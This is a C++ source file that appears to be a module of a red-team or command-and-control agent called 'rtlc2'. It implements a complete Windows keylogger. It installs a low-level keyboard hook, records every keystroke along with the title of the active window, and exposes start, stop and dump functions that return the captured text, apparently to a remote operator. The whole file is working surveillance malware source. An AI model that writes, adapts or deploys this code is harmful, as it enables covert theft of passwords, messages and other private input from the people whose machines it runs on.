// Keylogger - Low-level keyboard hook with window context
// Captures keystrokes and the active window title
#include "agent.h"

#ifdef RTLC2_WINDOWS

#include <windows.h>
#include <cstring>
#include <string>
#include <sstream>
#include <mutex>
#include <atomic>

namespace rtlc2 {
namespace modules {

static std::atomic<bool> g_keylogRunning{false};
static HHOOK g_keyHook = NULL;
static std::string g_keyBuffer;
static std::string g_lastWindow;
static std::mutex g_keyMutex;
static HANDLE g_keyThread = NULL;

// Get the foreground window title
static std::string GetActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return "";
    char title[256] = {};
    GetWindowTextA(hwnd, title, sizeof(title));
    return title;
}

// Map virtual key to readable string
static std::string VKToString(DWORD vk, bool shift) {
    switch (vk) {
        case VK_RETURN: return "\n";
        case VK_TAB: return "\t";
        case VK_SPACE: return " ";
        case VK_BACK: return "[BS]";
        case VK_ESCAPE: return "[ESC]";
        case VK_DELETE: return "[DEL]";
        case VK_LEFT: return "[LEFT]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        case VK_LCONTROL: case VK_RCONTROL: return "";
        case VK_LSHIFT: case VK_RSHIFT: return "";
        case VK_LMENU: case VK_RMENU: return "";
        case VK_CAPITAL: return "[CAPS]";
        default: break;
    }

    // Alphanumeric keys
    if (vk >= 'A' && vk <= 'Z') {
        char c = (char)vk;
        bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
        if (!shift && !caps) c += 32; // lowercase
        if (shift && caps) c += 32;
        return std::string(1, c);
    }

    if (vk >= '0' && vk <= '9') {
        if (shift) {
            const char* shiftNum = ")!@#$%^&*(";
            return std::string(1, shiftNum[vk - '0']);
        }
        return std::string(1, (char)vk);
    }

    // Special characters
    BYTE keyState[256] = {};
    GetKeyboardState(keyState);
    WCHAR wBuf[4] = {};
    int ret = ToUnicode(vk, MapVirtualKeyA(vk, MAPVK_VK_TO_VSC), keyState, wBuf, 4, 0);
    if (ret > 0) {
        char mBuf[8] = {};
        WideCharToMultiByte(CP_ACP, 0, wBuf, ret, mBuf, sizeof(mBuf), NULL, NULL);
        return mBuf;
    }

    return "[0x" + std::to_string(vk) + "]";
}

// Low-level keyboard hook callback
static LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lParam;
        bool shift = (GetAsyncKeyState(VK_LSHIFT) & 0x8000) ||
                     (GetAsyncKeyState(VK_RSHIFT) & 0x8000);

        std::string key = VKToString(kbs->vkCode, shift);
        if (!key.empty()) {
            std::lock_guard<std::mutex> lock(g_keyMutex);

            // Check if window changed
            std::string currentWindow = GetActiveWindowTitle();
            if (currentWindow != g_lastWindow && !currentWindow.empty()) {
                g_lastWindow = currentWindow;
                g_keyBuffer += "\n--- [" + currentWindow + "] ---\n";
            }

            g_keyBuffer += key;
        }
    }
    return CallNextHookEx(g_keyHook, nCode, wParam, lParam);
}

// Message loop thread for the keyboard hook
static DWORD WINAPI KeylogThreadProc(LPVOID) {
    g_keyHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);
    if (!g_keyHook) {
        g_keylogRunning.store(false);
        return 1;
    }

    MSG msg;
    while (g_keylogRunning.load()) {
        if (PeekMessageA(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }
        Sleep(10);
    }

    UnhookWindowsHookEx(g_keyHook);
    g_keyHook = NULL;
    return 0;
}

std::string StartKeylogger() {
    if (g_keylogRunning.load()) return "Keylogger already running";

    g_keylogRunning.store(true);
    {
        std::lock_guard<std::mutex> lock(g_keyMutex);
        g_keyBuffer.clear();
        g_lastWindow.clear();
    }

    g_keyThread = CreateThread(NULL, 0, KeylogThreadProc, NULL, 0, NULL);
    if (!g_keyThread) {
        g_keylogRunning.store(false);
        return "Failed to start keylogger thread";
    }

    return "Keylogger started";
}

std::string StopKeylogger() {
    if (!g_keylogRunning.load()) return "Keylogger not running";

    g_keylogRunning.store(false);
    if (g_keyThread) {
        WaitForSingleObject(g_keyThread, 5000);
        CloseHandle(g_keyThread);
        g_keyThread = NULL;
    }

    return "Keylogger stopped";
}

std::string DumpKeylog() {
    std::lock_guard<std::mutex> lock(g_keyMutex);
    if (g_keyBuffer.empty()) return "No keystrokes captured";

    std::string result = g_keyBuffer;
    g_keyBuffer.clear();
    return result;
}

} // namespace modules
} // namespace rtlc2

#endif // RTLC2_WINDOWS
